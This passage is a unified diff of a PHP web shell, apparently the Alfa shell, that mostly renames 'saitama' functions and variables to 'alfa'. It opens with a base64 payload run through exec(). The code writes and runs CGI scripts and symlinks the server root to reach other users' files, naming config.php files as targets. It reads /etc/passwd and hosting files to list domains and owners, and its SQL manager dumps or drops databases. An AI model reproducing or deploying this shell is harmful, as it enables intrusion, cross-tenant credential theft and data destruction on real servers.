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")),\'<string>\',\'exec\'))';
+	$cginame = "symperl.alfa";
 	$source = $perl;
 	$lang = "perl";
-	if($_POST["saitama2"]=="sympy"){
-		$cginame = "pysymlink.saitama";
+	if($_POST["alfa2"]=="sympy"){
+		$cginame = "pysymlink.alfa";
 		$source = $py;
 		$lang = "python";
 	}
 	@__write_file($cginame,$source);
 	@chmod($cginame,0755);
 	echo __pre();
-	$resource = saitamaEx("{$lang} {$cginame} {$sympath}",false,true,true);
+	$resource = alfaEx("{$lang} {$cginame} {$sympath}",false,true,true);
 	if(strlen($resource) == 0){
-		echo saitamaiFrameCreator('cgisaitama/'.$cginame);
+		echo AlfaiFrameCreator('cgialfa/'.$cginame);
 	}else{
 		echo $resource;
 	}
 }
-if(isset($_POST['saitama4']) && $_POST['saitama4']=='SymFile'){
-if(function_exists('symlink')||_saitama_can_runCommand(true,true)){
-saitamaNum(9,10);
+if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile'){
+if(function_exists('symlink')||_alfa_can_runCommand(true,true)){
+AlfaNum(9,10);
 echo __pre().'
 <center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
 <input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
-<input type="text" name="symfile" placeholder="Example : saitama.txt" size="60"/>
+<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
 <p><input type="submit" value=" " name="symlink" /></p></form></center>';
-$path = $_POST['saitama5'];
-$symname = $_POST['saitama6'];
-$solevisible58 = $_POST['saitama7'];
+$path = $_POST['alfa5'];
+$symname = $_POST['alfa6'];
+$solevisible58 = $_POST['alfa7'];
 if($solevisible58){
 $new_name = str_replace(".", "_", basename($symname));
 $rand_dir = $new_name.rand(111,9999);
-$sym_dir = 'saitamasymlinkphp/'.$rand_dir.'/';
+$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
 @mkdir($sym_dir, 0777, true);
-saitamacgihtaccess('sym', $sym_dir, $symname);
-_saitama_symlink("$path","$sym_dir/$symname");
+alfacgihtaccess('sym', $sym_dir, $symname);
+_alfa_symlink("$path","$sym_dir/$symname");
 echo __pre();
-echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__SAITAMA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
+echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
 }
-}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#00ffff\">[+] Symlink Function Disabled !</b></font></pre></center>";}
+}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
 }
-if(isset($_POST['saitama2']) && $_POST['saitama2']=='symphp'){
+if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
 $cant_symlink = true;
-if(function_exists('symlink')||_saitama_can_runCommand(false,false)){
-@mkdir('saitamasymlink',0777);
-saitamacgihtaccess('sym','saitamasymlink/');
-_saitama_symlink('/','saitamasymlink/root');
-$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#00ffff;'><b>Users</span></b></td><td><span style='color:#E6E6FA;'><b>symlink</span></b></td>";
-if(_saitama_file_exists("/etc/named.conf") && !_saitama_file_exists("/etc/virtual/domainowners") && _saitama_file_exists("/etc/valiases/")){
+if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
+@mkdir('alfasymlink',0777);
+alfacgihtaccess('sym','alfasymlink/');
+_alfa_symlink('/','alfasymlink/root');
+$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
+if(_alfa_file_exists("/etc/named.conf") && !_alfa_file_exists("/etc/virtual/domainowners") && _alfa_file_exists("/etc/valiases/")){
 echo "<center>";
 $lines = array();
 $anony_domains = array();
@@ -4356,19 +4357,19 @@ $f_black = array();
 $error = false;
 $anonymous = false;
 $makepwd = "/home/{user}/public_html/";
-$domains = saitamaGetDomains();
+$domains = alfaGetDomains();
 $lines = $domains["lines"];
 $state = $domains["state"];
 $is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
-$can_runcmd = _saitama_can_runCommand(false,false);
+$can_runcmd = _alfa_can_runCommand(false,false);
 if(!$is_posix && !$can_runcmd){
 	$anonymous = true;
 	$anony_domains = $domains["lines"];
-	$lines = _saitama_file('/etc/passwd');
+	$lines = _alfa_file('/etc/passwd');
 }
 echo $table_header;
 $count=1;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#00ffff;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__SAITAMA_DATA_FOLDER__.'/saitamasymlink/root{sympath}" target="_blank"><span style="color:#E6E6FA;">Symlink</span></a></td></tr>';
+$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 foreach($lines as $line){
 	$domain = "";
 	$owner = "";
@@ -4422,12 +4423,12 @@ foreach($lines as $line){
 			$domain = $line;
 		}
 		if(strlen(trim($domain)) > 2 && $state != "passwd"){
-			if(!_saitama_file_exists('/etc/valiases/'.$domain, false))continue;
+			if(!_alfa_file_exists('/etc/valiases/'.$domain, false))continue;
 			if($is_posix){
 				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
 				$owner = $user["name"];
 			}elseif($can_runcmd){
-				$owner = saitamaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
+				$owner = alfaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
 			}
 		}
 	}
@@ -4454,15 +4455,15 @@ if($anonymous){
 $cant_symlink = false;
 }else{
 $is_direct = false;
-$makepwd = saitamaMakePwd();
-if(_saitama_file_exists("/etc/virtual/domainowners")){
+$makepwd = alfaMakePwd();
+if(_alfa_file_exists("/etc/virtual/domainowners")){
 	$makepwd = "/home/{user}/public_html";
 	$is_direct = true;
 }
-$sole = _saitama_file("/etc/virtual/domainowners");
+$sole = _alfa_file("/etc/virtual/domainowners");
 $count=1;
 echo $table_header;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#00ffff;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__SAITAMA_DATA_FOLDER__.'/saitamasymlink/root{cwd}" target="_blank"><span style="color:#E6E6FA;">Symlink</span></a></td></tr>';
+$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 if($sole){
 	foreach($sole as $visible){
 		if(@strstr($visible,":")){
@@ -4472,7 +4473,7 @@ if($sole){
 		}
 	}
 }else{
-	$passwd = _saitama_file("/etc/passwd");
+	$passwd = _alfa_file("/etc/passwd");
 	if($passwd){
 		$html = "";
 		$is_named = false;
@@ -4487,10 +4488,10 @@ if($sole){
 		}
 		$site_domains = @scandir("/etc/virtual/");
 		if(!$site_domains){
-			$site_domains = saitamaEx("ls /etc/virtual/");
+			$site_domains = alfaEx("ls /etc/virtual/");
 			$site_domains = explode("\n", $site_domains);
 			if(!$site_domains){
-				$site_domains = _saitama_file("/etc/named.conf");
+				$site_domains = _alfa_file("/etc/named.conf");
 				if($site_domains){$is_named = true;}
 			}
 		}
@@ -4544,16 +4545,16 @@ echo "</table>";
 $cant_symlink = false;
 }
 }else{
-	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#00ffff\">[+] Symlink Function Disabled !</b></font></pre></center>";
+	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
 	$cant_symlink = false;
 }
-if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#00ffff">Error...</font></b><br>';
+if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
 echo "</center></table>";
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamasql(){
+function alfasql(){
 class DbClass{
 public $type;
 public $link;
@@ -4678,7 +4679,7 @@ return false;
 }
 };
 $db = new DbClass($_POST['type']);
-saitamahead();
+alfahead();
 $form_visibility = "table";
 if(isset($_POST['sql_host'])){
 	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
@@ -4688,7 +4689,7 @@ if(isset($_POST['sql_host'])){
 }
 $database_list = array();
 echo "
-<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='saitamaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
+<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
 <div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($form_visibility=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
 <td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
 <td><select name='type'><option value='mysql' selected>mysql</option></select></td>
@@ -4726,29 +4727,29 @@ if(!empty($curr_mysql_id)){
 	if(!empty($_POST['sql_base'])){
 		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
 	}
-	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."saitamaConnectionHistoryUpdate();</script>";
+	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."alfaConnectionHistoryUpdate();</script>";
 }
 if(isset($db) && $db->link){
 if(!empty($_POST['sql_base'])){
-echo "<div class='mysql-main'><div mode='block' onclick='saitamaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='saitamaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='saitamaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
+echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
 foreach ($database_list as $db_name) {
-	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="saitamaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
+	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
 	if($db_name == $_POST['sql_base']){
 		$db->selectdb($_POST['sql_base']);
 		$tbls_res = $db->listTables();
-		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="saitamaMysqlFilterTable(this);" name="filter"></div></li>';
+		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
 		while($item = $db->fetch($tbls_res)){
 		list($key, $value) = each($item);
 		if(!empty($_POST['sql_count']))
 		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
 		$value = htmlspecialchars($value);
-		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"saitamaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
+		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
 		}
-		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="saitamaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="saitamaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="saitamaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
+		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
 	}
 	echo "</div></li>";
 }
-echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='saitamaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='saitamaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='saitamaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='saitamaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='saitamaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='saitamaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='saitamaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
+echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
 }
 echo "</table></div>";
 echo "</div>";
@@ -4756,12 +4757,12 @@ echo "</div>";
 echo htmlspecialchars($db->error());
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamaSql_manager_api(){
-	$db = $_POST["saitama1"];
-	$type = $_POST["saitama2"];
-	$sql_count = $_POST["saitama3"] == "true" ? true : false;
+function alfaSql_manager_api(){
+	$db = $_POST["alfa1"];
+	$type = $_POST["alfa2"];
+	$sql_count = $_POST["alfa3"] == "true" ? true : false;
 	$db = @json_decode($db, true);
 	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
 	@mysqli_set_charset($conn, "utf8");
@@ -4806,8 +4807,8 @@ function saitamaSql_manager_api(){
 				}
 				echo @json_encode($tables);
 			}else{
-				if(strlen(saitamaEx("mysqldump"))>0){
-					saitamaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
+				if(strlen(alfaEx("mysqldump"))>0){
+					alfaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
 				}else{
 					$fp = @fopen($db["dump_file"], "w");
 					foreach ($db["tables"] as $table) {
@@ -4986,7 +4987,7 @@ function saitamaSql_manager_api(){
 				$col_key = @mysqli_fetch_row($col_key);
 				$col_key = $col_key[0];
 				if(!empty($col_key)){
-					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="saitamaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
 				}
 			}else{
 				$col_key = false;
@@ -4995,7 +4996,7 @@ function saitamaSql_manager_api(){
 				if(!$title){
 					$tbl_content .= '<tr style="background-color:#305b8e;">';
 					if($col_key){
-						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="saitamaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
+						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
 					}
 					foreach($item as $key => $value){
 						$tbl_content .= '<th>'.$key.'</th>';
@@ -5006,7 +5007,7 @@ function saitamaSql_manager_api(){
 				}
 
 				if($col_key){
-					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="saitamaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="saitamaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
